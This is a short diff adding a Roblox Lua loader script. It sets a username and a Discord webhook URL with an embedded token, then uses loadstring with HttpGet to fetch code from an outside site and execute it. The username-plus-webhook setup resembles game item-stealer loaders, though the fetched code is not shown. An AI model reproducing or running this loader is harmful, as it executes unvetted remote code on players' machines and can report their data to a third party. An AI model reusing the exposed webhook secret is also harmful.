@@ -1,0 +1,4 @@
+UserName = "KamJR_Gaming"
+Webhook = "https://discord.com/api/webhooks/1096593341522649208/CMUXfcLv5tCHA74RHFAwFyd58vMQnc3yXpqySgaxf6QJR6q4sxrK9IfF2dvtDYkweFMn" -- optional delete the whole line if you don't want it
+
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
